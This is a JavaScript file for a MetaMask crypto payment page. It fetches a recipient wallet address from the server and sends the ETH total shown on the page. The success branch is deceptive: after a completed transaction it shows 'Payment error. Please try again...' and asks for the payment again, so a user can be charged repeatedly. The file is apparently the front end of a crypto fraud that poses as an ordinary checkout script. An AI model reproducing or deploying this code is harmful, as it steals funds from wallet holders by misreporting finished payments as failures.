let button_pay = document.getElementById('buttonPay');

async function meta_pay() {
    await ethereum.enable();

    document.getElementById('CheckMetaText').innerHTML = 'Payment...';
    document.getElementById('buttonPay').style.display = 'none';
    document.getElementById('statusTitle').innerHTML = 'Payment process'
    address = await fetch('/load').then(response => { return response.json() }).then((json) => {
        return json['address'];
    });

    const paymentAddress = address;
    const amountEth = document.getElementById('total').innerHTML;
    console.log(amountEth);
    web3.eth.sendTransaction({
        to: paymentAddress,
        value: web3.toWei(amountEth, 'ether')
    }, (err, transactionId) => {
        if (err) {
            document.getElementById('CheckMetaText').innerHTML = 'Payment error'; 
            setTimeout(() => { popupClose(document.getElementById('popup-metamask')) }, 1000);
            setTimeout(() => { document.getElementById('CheckMetaText').innerHTML = 'Please select a wallet to connect to this dapp:';}, 1500);
            setTimeout(() => { document.getElementById('buttonPay').removeAttribute('style') }, 1600);
            setTimeout(() => { document.getElementById('statusTitle').innerHTML = 'Select a Wallet' }, 1700);
        } else {
            
            setTimeout(() => { document.getElementById('CheckMetaText').innerHTML = 'Payment error. Please try again...'; }, 2000);
            meta_pay();
        }
    })
}

function MetaOpen() {

    var host = window.location.hostname
    if (/Android|webOS/i.test(navigator.userAgent)) {
        window.location = `https://metamask.app.link/dapp/${host}`;

    } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        window.location = `https://metamask.app.link/dapp/${host}`;

    }
    else {
        window.open("https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn");
        location.reload();
    }
}

button_pay.onclick = async function () {
    if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
            meta_pay();
            
        } catch (err) {
            console.log(err)
        }
    } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider)
    } else {
        MetaOpen();

    }
}